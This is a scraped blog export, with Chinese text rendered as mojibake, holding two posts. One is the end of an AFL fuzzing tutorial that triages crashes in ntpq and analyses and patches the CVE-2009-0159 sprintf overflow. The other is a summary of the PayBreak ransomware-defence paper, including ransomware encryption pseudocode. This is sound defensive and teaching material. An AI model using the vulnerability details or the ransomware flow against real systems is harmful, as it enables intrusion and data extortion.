ntp-4.2.2/ntpq/ntpq_modified ä¸¾ä¸ªä¾‹å­ï¼Œå½“ä½ å‘ç°ç›®æ ‡ç¨‹åºå°è¯•å†™å…¥\\è·³è½¬åˆ°ä¸€ä¸ªæ˜æ˜¾æ¥è‡ªè¾“å…¥æ–‡ä»¶çš„å†…å­˜åœ°å€ï¼Œé‚£ä¹ˆå°±å¯ä»¥çŒœæµ‹è¿™ä¸ªbugåº”è¯¥æ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼›ç„¶è€Œé‡åˆ°ä¾‹å¦‚NULL pointer dereferencesè¿™æ ·çš„æ¼æ´å°±æ²¡é‚£ä¹ˆå®¹æ˜“åˆ¤æ–­äº†ã€‚ å°†ä¸€ä¸ªå¯¼è‡´crashæµ‹è¯•ç”¨ä¾‹ä½œä¸ºafl-fuzzçš„è¾“å…¥ï¼Œä½¿ç”¨-Cé€‰é¡¹å¼€å¯crash explorationæ¨¡å¼åï¼Œå¯ä»¥å¿«é€Ÿåœ°äº§ç”Ÿå¾ˆå¤šå’Œè¾“å…¥crashç›¸å…³ã€ä½†ç¨æœ‰äº›ä¸åŒçš„crashesï¼Œä»è€Œåˆ¤æ–­èƒ½å¤Ÿæ§åˆ¶æŸå—å†…å­˜åœ°å€çš„é•¿åº¦ã€‚è¯¥æ–‡ç« ä¸­æœ‰ä¸€ä¸ªå¾ˆä¸é”™çš„ä¾‹å­â€”â€”tcpdumpæ ˆæº¢å‡ºæ¼æ´ï¼Œcrash explorationæ¨¡å¼ä»ä¸€ä¸ªcrashäº§ç”Ÿäº†42ä¸ªæ–°çš„crashï¼Œå¹¶è¯»å–ä¸åŒå¤§å°çš„ç›¸é‚»å†…å­˜ã€‚ triage_crashesAFLæºç çš„experimentalç›®å½•ä¸­æœ‰ä¸€ä¸ªåä¸ºtriage_crashes.shçš„è„šæœ¬ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è§¦å‘æ”¶é›†åˆ°çš„crashesã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œ11ä»£è¡¨äº†SIGSEGVä¿¡å·ï¼Œæœ‰å¯èƒ½æ˜¯å› ä¸ºç¼“å†²åŒºæº¢å‡ºå¯¼è‡´è¿›ç¨‹å¼•ç”¨äº†æ— æ•ˆçš„å†…å­˜ã€‚è€Œå…¶ä»–å¦‚06ä»£è¡¨äº†SIGABRTä¿¡å·ï¼Œå¯èƒ½æ˜¯æ‰§è¡Œäº†abort\\assertå‡½æ•°æˆ–double freeå¯¼è‡´ã€‚ 123456789~/AFL-2.57b/experimental/crash_triage/triage_crashes.sh out_test ntp-4.2.2/ntpq/ntpq_modified 2&gt;&amp;1 | grep SIGNAL +++ ID 000000, SIGNAL 11 +++ +++ ID 000001, SIGNAL 11 +++ +++ ID 000002, SIGNAL 11 +++ +++ ID 000003, SIGNAL 11 +++ +++ ID 000004, SIGNAL 11 +++ +++ ID 000005, SIGNAL 11 +++ +++ ID 000006, SIGNAL 11 +++ ... crashwalkå½“ç„¶ä¸Šé¢çš„ä¸¤ç§æ–¹å¼éƒ½è¿‡äºé¸¡è‚‹äº†ï¼Œå¦‚æœä½ æƒ³å¾—åˆ°æ›´ç»†è‡´çš„crashesåˆ†ç±»ç»“æœï¼Œä»¥åŠå¯¼è‡´crashesçš„å…·ä½“åŸå› ï¼Œé‚£ä¹ˆcrashwalkå°±æ˜¯ä¸é”™çš„é€‰æ‹©ä¹‹ä¸€ã€‚è¿™ä¸ªå·¥å…·åŸºäºgdbçš„exploitableæ’ä»¶ï¼Œå®‰è£…ä¹Ÿç›¸å¯¹ç®€å•ï¼ˆä½†æˆ‘æ‡’å¾—è£…ï¼‰ï¼Œå…·ä½“æ–¹æ³•å¯ä»¥å‚è€ƒå·¥å…·çš„å®‰è£…æ–‡æ¡£ã€‚ crashwalkæ”¯æŒAFL/Manualä¸¤ç§æ¨¡å¼ã€‚å‰è€…é€šè¿‡è¯»å–crashes/README.txtæ–‡ä»¶è·å¾—ç›®æ ‡çš„æ‰§è¡Œå‘½ä»¤ï¼Œåè€…åˆ™å¯ä»¥æ‰‹åŠ¨æŒ‡å®šä¸€äº›å‚æ•°ã€‚ä¸¤ç§ä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š 1234# Manual Modecwtriage -root ./crashes/ -match id -- ntp-4.2.2/ntpq/ntpq_modified# AFL Modecwtriage -root . -afl ä¸¤ç§æ¨¡å¼çš„è¾“å‡ºç»“æœéƒ½ä¸€æ ·ï¼Œä¹Ÿæ¯”å‰é¢å‡ ç§æ–¹æ³•è¦è¯¦ç»†å¤šäº†ï¼Œä½†å½“æœ‰å¤§é‡crashesæ—¶ç»“æœè¿˜æ˜¯æ˜¾å¾—ååˆ†æ··ä¹±ã€‚ afl-collectæœ€åé‡ç£…æ¨èçš„å·¥å…·ä¾¿æ˜¯afl-collectï¼Œå®ƒä¹Ÿæ˜¯afl-utilså¥—ä»¶ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼ŒåŒæ ·ä¹Ÿæ˜¯åŸºäºexploitableæ¥æ£€æŸ¥crashesçš„å¯åˆ©ç”¨æ€§ã€‚å®ƒå¯ä»¥è‡ªåŠ¨åˆ é™¤æ— æ•ˆçš„crashæ ·æœ¬ã€åˆ é™¤é‡å¤æ ·æœ¬ä»¥åŠè‡ªåŠ¨åŒ–æ ·æœ¬åˆ†ç±»ã€‚ä½¿ç”¨èµ·æ¥å‘½ä»¤ç¨å¾®é•¿ä¸€ç‚¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1afl-collect -j 8 -d crashes.db -e gdb_script ./out ./in -- ntp-4.2.2/ntpq/ntpq_modified --target-opts ä½†æ˜¯ç»“æœå°±åƒä¸‹é¢è¿™æ ·éå¸¸ç›´è§‚ï¼š æ¼æ´åˆ†æ12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758/** Format values*/#define OC 12 /* integer, print in octal *//* skip *//* * cookedprint - output variables in cooked mode */static voidcookedprint( int datatype, int length, char *data, int status, FILE *fp)&#123; register int varid; char *name; char *value; int fmt; struct ctl_var *varlist; u_long uval;/* skip */ while (nextvar(&amp;length, &amp;data, &amp;name, &amp;value)) &#123; varid = findvar(name, varlist, 0); if (varid == 0) &#123; /* skip */ &#125; else &#123; output_raw = 0; fmt = varlist[varid].fmt; switch (fmt) &#123; /* skip */ case OC: if (!decodeuint(value, &amp;uval)) output_raw = &#x27;?&#x27;; else &#123; char b[10]; (void)sprintf(b, &quot;%03lo&quot;, uval); output(fp, name, b); &#125; break; /* skip */ &#125; &#125; &#125; /* not vital */&#125; ç¨‹åºä½¿ç”¨whileå¾ªç¯è¿­ä»£æ£€ç´¢dataç¼“å†²åŒºçš„ä¸‹ä¸€ä¸ªå˜é‡ï¼Œç„¶åè°ƒç”¨findvar()åˆ¤æ–­nameæ˜¯å¦å·²çŸ¥ã€‚å½“è¿”å›ä¸ä¸º0æ—¶ï¼Œå®ƒä¼šè·³è½¬åˆ°elseå¹¶å°†fmtè®¾ç½®ä¸ºctl_varç»“æ„ä¸­çš„ç›¸åº”å˜é‡ã€‚å½“è¯¥æ ¼å¼ä¸º0Cæ—¶ï¼ˆ#define OC 12 /* integer, print in octal */)ï¼Œå®ƒå°†è°ƒç”¨decodeuintä»valueä¸­è§£ç ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°å¹¶å°†ç»“æœå­˜å‚¨åˆ° uvalæ— ç¬¦å·longä¸­ã€‚å¦‚æœå¤±è´¥ï¼Œå®ƒå°†è·³åˆ°elseéƒ¨åˆ†ï¼Œåœ¨è¯¥éƒ¨åˆ†ä¸­ä¼šå£°æ˜ä¸€ä¸ª10å­—èŠ‚å¤§å°çš„æœ¬åœ°ç¼“å†²åŒºï¼Œç„¶åå°è¯•å‘å…¶ä¸­å†™å…¥è§£æä¸ºæœ‰ç¬¦å·å…«è¿›åˆ¶é•¿æ•´å‹çš„uvalã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å†™å…¥ä¸åŒ…æ‹¬NULLçš„11ä¸ªå­—èŠ‚ã€‚ç”±äºç¼“å†²åŒºbåªæœ‰10ä¸ªå­—èŠ‚é•¿ï¼Œå› æ­¤ä¸Šé¢çš„ä»£ç å¯èƒ½ä¼šå‡ºç°off-by-two overflowï¼Œåé¢å¯¹output()çš„è°ƒç”¨åªæ˜¯å°†name = b ä¼ ç»™åˆ°fp ã€‚ è¡¥ä¸å°†ä»£ç ä¿®æ”¹å¦‚ä¸‹å³å¯ã€‚ 12345678 output_raw = &#x27;?&#x27;;else &#123; //char b[10]; char b[12]; //(void) sprintf(b, &quot;%03lo&quot;, uval); (void) snprintf(b, sizeof(b), &quot;%03lo&quot;,uval); output(fp, name, b); &#125; å¢åŠ ç¼“å†²åŒºå¤§å°å¹¶ä½¿ç”¨æ›´ä¸ºå®‰å…¨çš„snprintfå‡½æ•°ã€‚ å‚è€ƒhttps://lcamtuf.coredump.cx/afl/QuickStartGuide.txt â†©https://github.com/google/AFL/releases â†©https://www.mail-archive.com/debian-bugs-dist@lists.debian.org/msg1643066.html â†©https://nvd.nist.gov/vuln/detail/CVE-2009-0159 â†©https://www.cnblogs.com/tomyyyyy/articles/13610206.html â†©","categories":[],"tags":[{"name":"Fuzzing","slug":"Fuzzing","permalink":"https://mundi-xu.github.io/tags/Fuzzing/"},{"name":"AFL","slug":"AFL","permalink":"https://mundi-xu.github.io/tags/AFL/"},{"name":"CVE","slug":"CVE","permalink":"https://mundi-xu.github.io/tags/CVE/"},{"name":"ntp","slug":"ntp","permalink":"https://mundi-xu.github.io/tags/ntp/"},{"name":"æ¨¡ç³Šæµ‹è¯•","slug":"æ¨¡ç³Šæµ‹è¯•","permalink":"https://mundi-xu.github.io/tags/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"}]},{"title":"PayBreaké˜²å‹’ç´¢ç³»ç»Ÿç®€æ","slug":"PayBreaké˜²å‹’ç´¢ç³»ç»Ÿç®€æ","date":"2021-01-01T02:05:21.000Z","updated":"2021-01-06T05:12:53.244Z","comments":true,"path":"2021/01/01/PayBreaké˜²å‹’ç´¢ç³»ç»Ÿç®€æ/","link":"","permalink":"https://mundi-xu.github.io/2021/01/01/PayBreak%E9%98%B2%E5%8B%92%E7%B4%A2%E7%B3%BB%E7%BB%9F%E7%AE%80%E6%9E%90/","excerpt":"PayBreakæ˜¯ä¸€ç§åˆ›æ–°å¼€æºçš„ä¿æŠ¤æœºåˆ¶ï¼Œå¯ä»¥è§£å†³å¤§éƒ¨åˆ†åŸºäºæ··åˆåŠ å¯†çš„å‹’ç´¢è½¯ä»¶çš„å¨èƒã€‚","text":"æœ¬æ–‡æ•´ç†ç¿»è¯‘è‡ªPayBreak : Defense Against Cryptographic Ransomware ç®€ä»‹PayBreakåŸºäºå‡è®¾ï¼šæ–‡ä»¶åŠ å¯†ä¾èµ–äºæ··åˆåŠ å¯†ï¼ˆè¯‘è€…æ³¨ï¼šè¯¦è§æˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« ï¼‰ï¼Œå…¶ä¸­åœ¨å—å®³è®¡ç®—æœºä¸Šä½¿ç”¨å¯¹ç§°å¯†é’¥ã€‚ PayBreakæ£€æµ‹åˆ°è¿™äº›å¯†é’¥çš„ä½¿ç”¨ï¼Œå°†å®ƒä»¬ä¿å­˜åœ¨æ‰˜ç®¡ä¸­ï¼Œå› æ­¤å¯ä»¥è§£å¯†æ–‡ä»¶ï¼Œå¦åˆ™è¿™äº›æ–‡ä»¶åªèƒ½é€šè¿‡æ”¯ä»˜èµé‡‘æ‰èƒ½æ¢å¤ã€‚ æˆ‘ä»¬è®¤ä¸ºåº”å¯¹å‹’ç´¢è½¯ä»¶å¨èƒçš„ç°æœ‰æŠ€æœ¯å­˜åœ¨ä¸è¶³ï¼ˆè¯‘è€…æ³¨ï¼šè¯¥æ–‡å‘è¡¨è‡ª2017å¹´ï¼‰ï¼Œ å–è€Œä»£ä¹‹çš„æ˜¯ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§ç³»ç»Ÿï¼Œå…è®¸æœ‰å®‰å…¨æ„è¯†çš„ç”¨æˆ·ä¸»åŠ¨é˜²å¾¡å‹’ç´¢è½¯ä»¶æ”»å‡»ã€‚ï¼Œå®ƒå¯ä»¥ä½¿å—å®³è€…ä»å‹’ç´¢è½¯ä»¶æ„ŸæŸ“ä¸­æ¢å¤è€Œæ— éœ€æ”¯ä»˜èµé‡‘ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§å¯†é’¥æ‰˜ç®¡æœºåˆ¶ï¼Œè¯¥æœºåˆ¶å¯å°†åŠ å¯†å¯†é’¥å®‰å…¨åœ°å­˜å‚¨åœ¨å¯†é’¥åº“ä¸­ã€‚ ç¬¬ä¸€æ­¥ï¼Œç”¨æˆ·å¿…é¡»ç”Ÿæˆä¸€ä¸ªéå¯¹ç§°å¯†é’¥å¯¹ï¼Œå¹¶å°†å…¬é’¥æ·»åŠ åˆ°ç³»ç»Ÿä¸­ã€‚ æ­¤å…¬å…±å¯†é’¥ç”¨äºåŠ å¯†æ”¾ç½®åœ¨å¯†é’¥åº“ä¸­çš„å¯†é’¥ã€‚ åœ¨æ­£å¸¸è¿è¡ŒæœŸé—´ï¼Œæˆ‘ä»¬çš„ç³»ç»Ÿç›‘è§†åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œçš„ç¨‹åºï¼Œå¹¶æ‹¦æˆªå¯¹å®ç°å¯†ç åŸè¯­çš„å‡½æ•°çš„è°ƒç”¨ã€‚ æ­¤å¤–ï¼Œç³»ç»Ÿä¼šæ•è·å¯¹ç§°åŠ å¯†å¯†é’¥ï¼Œå¹¶ä½¿ç”¨å…¬é’¥å¯¹å…¶è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå°†ç»“æœå­˜å‚¨åœ¨å¯†é’¥åº“ä¸­ã€‚ ä¸€æ—¦ç”¨æˆ·æ„ŸæŸ“äº†å‹’ç´¢è½¯ä»¶å¹¶å¾—çŸ¥å¿…é¡»æ”¯ä»˜èµé‡‘æ‰èƒ½è®¿é—®æ–‡ä»¶ï¼Œå…¶å¯ä»¥ç®€å•åœ°ç”¨ç§é’¥è§£å¯†å¯†é’¥åº“å¹¶è§£å¯†æ–‡ä»¶è€Œæ— éœ€æ”¯ä»˜ä»»ä½•è´¹ç”¨ã€‚ ç»æµ‹è¯•ï¼ŒPayBreakç³»ç»Ÿè¿è¡Œäº†107ç§å‹’ç´¢ç—…æ¯’æ ·æœ¬ï¼ˆ12ä¸ªå®¶æ—ï¼‰ï¼ŒæˆåŠŸçš„æ¢å¤äº†æ‰€æœ‰åŠ å¯†æ–‡ä»¶ã€‚ è´¡çŒ® å¯¹åŸºäºç°ä»£åŠ å¯†æŠ€æœ¯çš„å‹’ç´¢è½¯ä»¶è¿›è¡Œäº†ç‰¹å¾åˆ†æ æå‡ºäº†ä¸€ç§å¯†é’¥åº“æœºåˆ¶ï¼Œè¯¥æœºåˆ¶å¯ä»¥ä¸»åŠ¨é˜²å¾¡åŸºäºåŠ å¯†çš„å‹’ç´¢è½¯ä»¶ åœ¨Windows 7æ“ä½œç³»ç»Ÿä¸‹å®ç°äº†PayBreakç³»ç»Ÿ é€šè¿‡åœ¨å—æ§ç¯å¢ƒä¸­è¿è¡Œ107ä¸ªå‹’ç´¢è½¯ä»¶æ ·æœ¬æ¥è¯„ä¼°PayBreakï¼Œå¹¶æˆåŠŸæ¢å¤äº†åäºŒä¸ªå¸¸è§å‹’ç´¢è½¯ä»¶å®¶æ—çš„ä»»ä½•ä¸€ä¸ªåŠ å¯†çš„æ‰€æœ‰æ–‡ä»¶ æµ‹è¯•äº†PayBreakå¯¹æ“ä½œç³»ç»Ÿå’Œæ—¥å¸¸ä½¿ç”¨çš„æ€§èƒ½å½±å“ èƒŒæ™¯åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºç°ä»£å‹’ç´¢è½¯ä»¶çš„å…¸å‹åŠ å¯†æµç¨‹ä»¥åŠå½±å“å‹’ç´¢è½¯ä»¶çš„å®é™…é™åˆ¶ï¼ŒåŒæ—¶ç®€å•ä»‹ç»PayBreakç³»ç»ŸåŸºäºçš„å¨èƒæ¨¡å‹ã€‚ Practical considerations for ransomwareå‹’ç´¢è½¯ä»¶çš„ç›®æ ‡æ˜¯é˜»æ­¢å—å®³è€…è®¿é—®å…¶æ•°æ®å¹¶å‹’ç´¢èµé‡‘ã€‚ç°ä»£å‹’ç´¢è½¯ä»¶å€Ÿé‰´äº†å®Œå–„çš„è‰¯æ€§å¯†ç å¥—ä»¶ï¼ˆä¾‹å¦‚OpenPGPæˆ–S/MIMEï¼‰ä¸­çš„æŠ€æœ¯ï¼Œå¹¶é‡‡ç”¨äº†æ‰€è°“çš„æ··åˆå¯†ç ç³»ç»Ÿã€‚ åœ¨æ··åˆå¯†ç ç³»ç»Ÿä¸­ï¼Œå‘é€è€…ä¸ºæ¯ä¸ªæ¶ˆæ¯ï¼ˆä¾‹å¦‚ï¼Œä¸ºæ¯ä¸ªéœ€è¦åŠ å¯†çš„æ–‡ä»¶ï¼‰é€‰æ‹©ä¸€ä¸ªéšæœºå¯¹ç§°å¯†é’¥ï¼Œå¹¶åœ¨è¯¥å¯†é’¥ä¸‹åŠ å¯†æ¯ä¸ªæ¶ˆæ¯ï¼ˆæˆ–æ–‡ä»¶ï¼‰ã€‚è¯¥ä¸€æ¬¡å¯¹ç§°å¯†é’¥é€šå¸¸ç§°ä¸ºä¼šè¯å¯†é’¥ã€‚éšåï¼Œæ··åˆå¯†ç ç³»ç»Ÿå°†ä½¿ç”¨æ¥æ”¶è€…çš„ï¼ˆéå¯¹ç§°ï¼‰å…¬é’¥å¯¹å¯¹ç§°æ¶ˆæ¯ä¸“ç”¨å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚å› æ­¤ï¼Œæ— è®ºåŠ å¯†å†…å®¹çš„å¤§å°å¦‚ä½•ï¼Œä»…éœ€è¦é«˜æ€§èƒ½çš„éå¯¹ç§°å¯¹ç§°åŠ å¯†æ“ä½œå³å¯åŠ å¯†å°çš„å¯¹ç§°å¯†é’¥ã€‚ç„¶åï¼Œå°†åŠ å¯†çš„å¯¹ç§°å¯†é’¥ä¸åŠ å¯†çš„å†…å®¹ç»„åˆå¹¶å‘é€åˆ°æœåŠ¡å™¨ã€‚ä¸ºäº†è§£å¯†æ•°æ®ï¼Œæ¥æ”¶è€…é¦–å…ˆä½¿ç”¨å…¶ç§é’¥è§£å¯†åŠ å¯†çš„å¯¹ç§°å¯†é’¥ã€‚æœ‰äº†å¯¹ç§°å¯†é’¥ï¼Œæ¥æ”¶è€…ä¾¿å¯ä»¥ç®€å•åœ°å°†æ•°æ®çš„å¯†æ–‡è§£å¯†ä¸ºåŸå§‹çš„çº¯æ–‡æœ¬ã€‚[1] åœ¨å‹’ç´¢è½¯ä»¶æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…åœ¨å…¶æ”»å‡»æœåŠ¡å™¨ä¸Šç”Ÿæˆäº†éå¯¹ç§°å¯†é’¥å¯¹ã€‚ åœ¨å—å®³è€…çš„æœºå™¨ä¸Šï¼Œæ¶æ„è½¯ä»¶ä¼šä¸ºæ¯ä¸ªåŠ å¯†çš„æ–‡ä»¶ç”Ÿæˆå”¯ä¸€çš„å¯¹ç§°ä¼šè¯å¯†é’¥ã€‚ ä¼šè¯å¯†é’¥ä½¿ç”¨æ”»å‡»è€…çš„å…¬å…±å¯†é’¥åŠ å¯†ï¼Œå¹¶ä¸åŠ å¯†çš„æ–‡ä»¶å†…å®¹ä¸€èµ·å­˜å‚¨ã€‚ ç„¶åï¼Œæ”»å‡»è€…å‘å—å®³è€…ç´¢è¦èµé‡‘ä»¥è·å–æŒ‡å®šçš„ç§é’¥è§£å¯†æ–‡ä»¶ã€‚ Hybrid Cryptographyå¦‚å‰æ‰€è¿°ï¼Œå¯¹ç§°å¯†é’¥ç”±éå¯¹ç§°å…¬é’¥ä¿æŠ¤ï¼ˆåŠ å¯†ï¼‰ã€‚åœ¨å‹’ç´¢è½¯ä»¶çš„æ”»å‡»é“¾ä¸­ï¼Œæ··åˆåŠ å¯†ç³»ç»Ÿä¸‹åŠ å¯†çš„æ¶ˆæ¯æ˜¯å—å®³è€…è®¡ç®—æœºä¸Šçš„æ–‡ä»¶ã€‚å› æ­¤ï¼Œæœ€ç»ˆå‹’ç´¢è½¯ä»¶æ”»å‡»çš„å¼ºåº¦å°±ç­‰ä»·äºæ··åˆå¯†ç ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚åŸºäºæ­¤äº‹å®ï¼Œè¢«åŠ å¯†çš„ç”¨æˆ·æ–‡ä»¶çš„åéªŒæ•‘æ´å°è¯•æ˜¯å¾ˆå…·æœ‰æŒ‘æˆ˜æ€§çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æä¾›äº†ä¸€ç§ä¿æŠ¤æœºåˆ¶ï¼Œå¯ä»¥ç»•è¿‡ç°ä»£å‹’ç´¢è½¯ä»¶æ ·æœ¬æ‰€é‡‡ç”¨çš„å¼ºå¯†ç åŸè¯­çš„æŒ‘æˆ˜ï¼Œè€Œä¸æ˜¯ç®€å•åœ°æ£€æµ‹åˆ°å—å®³è€…è®¡ç®—æœºæ˜¯å¦å·²æ„ŸæŸ“äº†å‹’ç´¢è½¯ä»¶ã€‚ å°½ç®¡ä»¥ä¸Šè®¨è®ºä¼¼ä¹æ˜¯ç†è®ºæ€§çš„ï¼Œä½†ç°ä»£å‹’ç´¢è½¯ä»¶ç³»åˆ—æ°æ°åˆ©ç”¨äº†è¿™ç§æ··åˆå¯†ç ç³»ç»Ÿã€‚è®¸å¤šæ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆå’Œå¹³å°éƒ½åŒ…å«ç»è¿‡å®è·µæ£€éªŒçš„åŠ å¯†ç®—æ³•ã€‚ä¾‹å¦‚ï¼Œ åœ¨Windowsä¸Šï¼Œä¸€ç§è¿™æ ·çš„å®ç°æ˜¯Microsoftçš„CryptoAPIã€‚ CryptoAPIæ˜¯ç”¨äºåŠ å¯†åŠŸèƒ½çš„å®‰å…¨æ¥å£ï¼Œå¯ä»¥ç¡®ä¿åœ¨æ¯ä¸ªWindowsæ“ä½œç³»ç»Ÿä¸­éƒ½å­˜åœ¨è¯¥æ¥å£ï¼Œå› æ­¤å¯¹äºå‹’ç´¢è½¯ä»¶ä½œè€…è€Œè¨€ï¼Œåˆ©ç”¨ç°æœ‰çš„åŠ å¯†åŠŸèƒ½éå¸¸ç®€å•ã€‚ Ransomware Pseudocode12345678910111213141516171819c2 = ConnectToCommandAndControl();// Private key kept secret on C2pubkey = c2.ReceivePubKey();hPubkey = CryptImport(pubkey);hCsp = CryptAcquireContext();while (filename = FindNextFile()) &#123; // Read ptFile = ReadFile(filename); // Generate random session key per file hSymkey = CryptGenKey(hCsp); // Then encrypt ctFile = CryptEncrypt(hSymkey, ptFile); keyblob = CryptExportKey(hPubkey, hSymkey); DeleteFile(filename); // Write encrypted session key WriteFile(filename, keyblob); // Append the encrypted file AppendFile(filename, ctFile);&#125; Threat modelæœ¬èŠ‚ä»‹ç»äº†æˆ‘ä»¬æå‡ºçš„ç³»ç»Ÿçš„å¨èƒæ¨¡å‹å’Œå‡è®¾ã€‚å…³äºè¿™äº›å‡è®¾çš„è¯¦ç»†è®¨è®ºä»¥åŠæˆ‘ä»¬ä¸ºä»€ä¹ˆè®¤ä¸ºå®ƒä»¬æ˜¯ç°å®çš„ï¼Œè¯·å‚è§åæ–‡ç¬¬6èŠ‚çš„è®¨è®ºéƒ¨åˆ†ã€‚æˆ‘ä»¬çš„å¨èƒæ¨¡å‹åŸºäºå¸¸è§ä¸”æˆåŠŸçš„å‹’ç´¢è½¯ä»¶ï¼Œå› æ­¤ï¼Œå¨èƒæ¨¡å‹è€ƒè™‘å·²åœ¨å—å®³è€…è®¡ç®—æœºä¸ŠæˆåŠŸå®‰è£…ä¸”å¯è¿è¡Œæ¶æ„è½¯ä»¶çš„æ”»å‡»è€…ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬çš„å¨èƒæ¨¡å‹ä¸­çš„æ“ä½œç³»ç»Ÿæ˜¯å¯ä¿¡å’Œç»å¸¸ç»´æŠ¤æ›´æ–°çš„ï¼Œå³æˆ‘ä»¬å‡è®¾æ¶æ„è½¯ä»¶ä¸èƒ½ææƒï¼Œå› ä¸ºè¿™ä¹Ÿä¼šç ´åä»»ä½•ç°æœ‰çš„è®¡ç®—æœºä¿æŠ¤æœºåˆ¶ï¼ˆå¦‚åæ¶æ„è½¯ä»¶è§£å†³æ–¹æ¡ˆï¼‰ã€‚å³ä½¿æˆ‘ä»¬å‡è®¾å‹’ç´¢è½¯ä»¶ä»…ä»¥ç”¨æˆ·çº§ç‰¹æƒæ‰§è¡Œï¼Œä½†å¤§å¤šæ•°ç°ä»£æ¶æ„è½¯ä»¶éƒ½æ˜¯è¢«åŠ å£³è¿‡çš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬çš„å¨èƒæ¨¡å‹å‡è®¾æ¶æ„è½¯ä»¶ä»…ç”±æ™®é€šçš„è½¯ä»¶åŠ å£³ã€‚æ›´å‡†ç¡®åœ°è¯´ï¼Œå¨èƒæ¨¡å‹åªè€ƒè™‘å¯ä»¥è¿è¡Œæ—¶è„±å£³çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œä¸è€ƒè™‘é‚£äº›åº”ç”¨é«˜çº§ç­–ç•¥æˆ–åŸºäºä»¿çœŸçš„åŠ å£³è½¯ä»¶ï¼ˆå¦‚Themidaï¼‰ã€‚ æˆ‘ä»¬æ‰¿è®¤ï¼Œæ›´å¤æ‚çš„å£³å’Œæ··æ·†æŠ€æœ¯å¯èƒ½ä¼šç ´åæˆ‘ä»¬æå‡ºçš„ç³»ç»Ÿã€‚å°½ç®¡æ­¤ç±»æŠ€æœ¯å·²å¹¿ä¸ºäººçŸ¥ï¼Œä½†è¿™äº›æŠ€æœ¯åœ¨æ•´ä¸ªæ¶æ„è½¯ä»¶ç¤¾åŒºä¸­å¹¶æœªå—åˆ°å¹¿æ³›åº”ç”¨ï¼Œè€Œä¸”è‡³å°‘æˆ‘ä»¬æå‡ºçš„æ–¹æ³•å¤§å¤§æé«˜äº†æ¶æ„è½¯ä»¶ä½œè€…ç»•è¿‡ä¿æŠ¤çš„é—¨æ§›ï¼ˆå³æ”»å‡»è€…å¿…é¡»å…‹æœè¿™äº›éš¾é¢˜ï¼‰ã€‚ æœ€åï¼Œæˆ‘ä»¬å‡è®¾ç”¨æˆ·å¯ä»¥åˆ›å»ºä¸€ä¸ªéå¯¹ç§°å¯†é’¥å¯¹æ¥ä½¿ç”¨æˆ‘ä»¬çš„ç³»ç»Ÿï¼Œå¹¶ä¸”åœ¨æ„ŸæŸ“å‹’ç´¢è½¯ä»¶ä¹‹å‰å°±å®Œæˆäº†ç³»ç»Ÿè®¾ç½®ï¼ˆå³å‹’ç´¢è½¯ä»¶çš„åŠ å¯†æ“ä½œå‘ç”Ÿåœ¨ç³»ç»Ÿæ„å»ºå®Œæˆä¹‹åï¼‰ã€‚ æ¦‚è¿°PayBreakç³»ç»Ÿç”±ä¸‰ä¸ªä¸åŒçš„ç»„ä»¶æ„æˆï¼Œè¯¥ç³»ç»Ÿèƒ½å¤Ÿæ¢å¤ç”±æ··åˆå¯†ç ç³»ç»Ÿå‹’ç´¢è½¯ä»¶åŠ å¯†çš„æ–‡ä»¶ã€‚ åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†ç®€å•ä»‹ç»è¿™äº›ç»„ä»¶åŠå…¶åœ¨ç³»ç»Ÿä¸­çš„ä½œç”¨ã€‚ ä¸‹å›¾æ¦‚è¿°äº†PayBreakçš„å·¥ä½œæ–¹æ¡ˆã€‚ ç”¨æˆ·ä½¿ç”¨éå¯¹ç§°å¯†é’¥å¯¹ï¼ˆpkuï¼Œskuï¼‰çš„å…¬é’¥ï¼ˆpkuï¼‰é…ç½®PayBreakï¼Œè€Œç§é’¥ï¼ˆskuï¼‰å­˜å‚¨åœ¨å¯ä¿¡è®¾å¤‡ä¸Šã€‚ ç³»ç»Ÿå°†è®¡ç®—æœºä¸Šä½¿ç”¨çš„æ‰€æœ‰åŠ å¯†ä¼šè¯å¯†é’¥è¿ç»­å­˜å‚¨åœ¨å®‰å…¨å¯†é’¥åº“ä¸­ï¼Œå½“ç”¨æˆ·çš„è®¡ç®—æœºä¸å¹¸æ„ŸæŸ“å‹’ç´¢è½¯ä»¶æ—¶ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ç§é’¥skuè®¿é—®ç³»ç»Ÿçš„å¯†é’¥åº“ï¼Œç„¶åä½¿ç”¨å­˜å‚¨åœ¨å¯†é’¥åº“ä¸­çš„æ•°æ®è§£å¯†æ–‡ä»¶ã€‚ è¯¥ç³»ç»Ÿåˆ©ç”¨äº†ä»¥ä¸‹äº‹å®ï¼šåœ¨æ··åˆå¯†ç ç³»ç»Ÿä¸­ï¼Œæ”»å‡»è€…å¿…é¡»åœ¨å¯¹ç§°åŠ å¯†æœŸé—´ä½¿ç”¨ä¼šè¯å¯†é’¥ã€‚ åœ¨å®é™…çš„å‹’ç´¢è½¯ä»¶æ”»å‡»ä¸­ï¼Œè¿™ç§åŠ å¯†å¿…é¡»åœ¨ç”¨æˆ·çš„è®¡ç®—æœºä¸Šè¿›è¡Œã€‚ 